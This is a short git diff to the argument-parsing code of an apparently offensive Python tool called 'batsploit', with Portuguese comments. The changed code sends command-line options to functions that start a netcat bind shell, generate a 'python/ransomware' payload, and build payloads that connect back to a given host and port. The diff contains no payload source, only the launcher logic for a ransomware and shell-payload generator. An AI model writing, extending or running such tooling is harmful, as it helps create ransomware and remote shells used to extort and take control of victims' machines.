@@ -39,17 +39,18 @@ else:
 				batsploit.usage_nc_bind(sys.argv[0]) # mostra como o bind é usad
 			else:
 				batsploit.nc_bind(lhost, lport)
-		if sys.argv[1] == "-payload" and sys.argv[2] == "python/ransomware":
+		if sys.argv[1] == "-payload":
 			if len(sys.argv) <= 4:
 				payload = sys.argv[2]
-				try:
-					name = sys.argv[3]
-				except IndexError:
-					batsploit.usage_payload_ransomware(sys.argv[0])
+				if payload == "python/ransomware":
+					try:
+						name = sys.argv[3]
+					except IndexError:
+						batsploit.usage_payload_ransomware(sys.argv[0])
+						sys.exit()
+					batsploit.create_payload(payload, 'data="data"', 'size=0', name)
 					sys.exit()
-				batsploit.create_payload(payload, 'data="data"', 'size=0', name)
-				sys.exit()
-			if len(sys.argv) == 6:
+			elif len(sys.argv) == 6:
 				payload = sys.argv[2]
 				lhost = sys.argv[3] # local host para o payload se conectar
 				lport = sys.argv[4] # local port para o pauload se conectar
